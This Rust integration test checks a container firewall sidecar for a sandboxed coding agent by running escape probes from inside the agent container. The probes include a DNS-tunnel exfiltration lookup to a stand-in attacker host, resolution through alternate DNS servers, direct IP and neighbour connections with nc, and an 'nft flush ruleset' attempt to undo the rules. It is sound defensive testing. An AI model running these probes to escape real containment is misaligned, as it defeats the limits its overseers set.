//! The firewall sidecar, checked the only way it can honestly be checked:
//! by running it and trying to get out (SPEC 4.1 bis, rule 7).
//!
//! `#[ignore]`d — it builds an image and lifts two containers. Run it by
//! hand, and after any change to `.hq/firewall/`:
//!
//! ```text
//! cargo test --test firewall -- --ignored --nocapture
//! ```

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Command;

use hq::compose::{AGENT_WRITABLE, NamedVolume, Plan, UserIds, generate, project_name};
use hq::harness::Role;
use hq::perimeter::{Sources, compute};

const FIREWALL_IMAGE: &str = "hq/firewall:test";
const SLOT: &str = "fwlive";
/// The one name the agent is allowed to resolve and reach.
const ALLOWED: &str = "example.com";

/// The address a container of this project got, so a probe can try to reach
/// it by number.
fn address_of(project: &str, service: &str) -> String {
    let id = Command::new("docker")
        .args(["compose", "-p", project, "ps", "-q", service])
        .output()
        .expect("docker is on the path");
    let id = String::from_utf8_lossy(&id.stdout).trim().to_string();
    assert!(!id.is_empty(), "{service} has no container");
    let out = Command::new("docker")
        .args([
            "inspect",
            "-f",
            "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
            &id,
        ])
        .output()
        .expect("docker is on the path");
    let address = String::from_utf8_lossy(&out.stdout).trim().to_string();
    assert!(!address.is_empty(), "{service} has no address");
    address
}

#[test]
#[ignore = "builds an image and lifts containers; run by hand"]
fn live_the_firewall_holds() {
    build_image();

    let dir = tempfile::tempdir().unwrap();
    let tree = dir.path().join("tree");
    let mission = dir.path().join("mission");
    std::fs::create_dir_all(&tree).unwrap();
    std::fs::create_dir_all(&mission).unwrap();
    for file in AGENT_WRITABLE {
        std::fs::write(mission.join(file), "").unwrap();
    }

    let perimeter = compute(
        Role::Coder,
        &Sources {
            stack: &[ALLOWED.to_string()],
            harness: &[],
            services: &[],
            forge: &["github.com".to_string()],
        },
    )
    .unwrap();

    let plan = Plan {
        slot: SLOT.to_string(),
        role: Role::Coder,
        // Busybox tools are all the probes need.
        image: "alpine:3.20".to_string(),
        firewall_image: FIREWALL_IMAGE.to_string(),
        user: UserIds { uid: 501, gid: 20 },
        tree: tree.clone(),
        tree_at: PathBuf::from("/work/tree"),
        mission_dir: mission.clone(),
        mission_dir_at: PathBuf::from("/work/mission"),
        credentials: Vec::new(),
        volumes: Vec::<NamedVolume>::new(),
        environment: BTreeMap::new(),
        command: vec!["sleep".to_string(), "600".to_string()],
        perimeter,
        // A neighbour on the slot's own network, declared the way a project
        // declares its services. Nothing allows it: reaching it must fail.
        project_services: Some(
            serde_yaml_ng::from_str("neighbour:\n  image: nginx:alpine\n").unwrap(),
        ),
        project_networks: Vec::new(),
    };

    let file = dir.path().join("mission.yml");
    std::fs::write(&file, generate(&plan).unwrap()).unwrap();

    let project = project_name(SLOT).unwrap();
    down(&file, &project);
    let up = compose(&file, &project, &["up", "-d", "--wait"]);
    assert!(
        up.status.success(),
        // A sidecar that fails to pose its rules is an agent that never
        // starts (rule 2) — so this failing is itself the guard working.
        "the pair did not come up:\n{}\n{}",
        String::from_utf8_lossy(&up.stdout),
        String::from_utf8_lossy(&up.stderr)
    );

    let checks: &[(&str, bool, &str)] = &[
        // what it must still be able to do
        (
            "an allowed name resolves",
            true,
            "nslookup example.com 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
        ),
        (
            "an allowed host is reachable",
            true,
            "wget -q -T5 -O /dev/null http://example.com/",
        ),
        // rule 3: nothing else resolves, by any route
        (
            "an off-list name resolves",
            false,
            "nslookup github.com 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
        ),
        (
            "an off-list name resolves via another server",
            false,
            "nslookup github.com 1.1.1.1 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
        ),
        (
            "an off-list name resolves over TCP",
            false,
            "nslookup -vc github.com 8.8.8.8 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
        ),
        (
            "a DNS tunnel carries data out",
            false,
            "nslookup exfil.attacker.example 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
        ),
        // rule 5: nothing is open because it is an address rather than a
        // name. Both of these are reachable from an unconstrained container,
        // which is what makes them worth probing.
        (
            "a forbidden address is reachable by number",
            false,
            "nc -z -w3 1.1.1.1 443",
        ),
        // rule 1: there is nothing to undo in the agent's container
        ("the agent can undo the rules", false, "nft flush ruleset"),
        (
            "the agent can even read the rules",
            false,
            "nft list ruleset | grep -q hqfw",
        ),
    ];

    let neighbour = address_of(&project, "neighbour");
    println!("the neighbour sits at {neighbour}");
    let neighbour_probe = format!("nc -z -w3 {neighbour} 80");

    let mut failures = Vec::new();
    let checks: Vec<(&str, bool, &str)> = checks
        .iter()
        .copied()
        .chain(std::iter::once((
            "an undeclared neighbour is reachable",
            false,
            neighbour_probe.as_str(),
        )))
        .collect();

    for (what, expected, script) in &checks {
        let got = compose(
            &file,
            &project,
            &["exec", "-T", "agent", "sh", "-c", script],
        )
        .status
        .success();
        println!("{:<48} {}", what, if got { "reached" } else { "refused" });
        if got != *expected {
            failures.push(format!(
                "{what}: expected {}, got {}",
                verb(*expected),
                verb(got)
            ));
        }
    }

    let id = compose(&file, &project, &["exec", "-T", "agent", "id"]);
    let id = String::from_utf8_lossy(&id.stdout).trim().to_string();
    down(&file, &project);

    assert!(
        id.starts_with("uid=501"),
        "the agent must run under the host's uid, got {id:?}"
    );
    assert!(failures.is_empty(), "{}", failures.join("\n"));
}

fn verb(reached: bool) -> &'static str {
    if reached { "reached" } else { "refused" }
}

fn build_image() {
    let context = Path::new(env!("CARGO_MANIFEST_DIR")).join(".hq/firewall");
    let out = Command::new("docker")
        .args(["build", "-q", "-t", FIREWALL_IMAGE])
        .arg(&context)
        .output()
        .expect("docker is on the path");
    assert!(
        out.status.success(),
        "building the sidecar failed:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
}

fn compose(file: &Path, project: &str, args: &[&str]) -> std::process::Output {
    Command::new("docker")
        .args(["compose", "-p", project, "-f"])
        .arg(file)
        .args(args)
        .output()
        .expect("docker is on the path")
}

fn down(file: &Path, project: &str) {
    compose(file, project, &["down", "-v", "--timeout", "1"]);
}
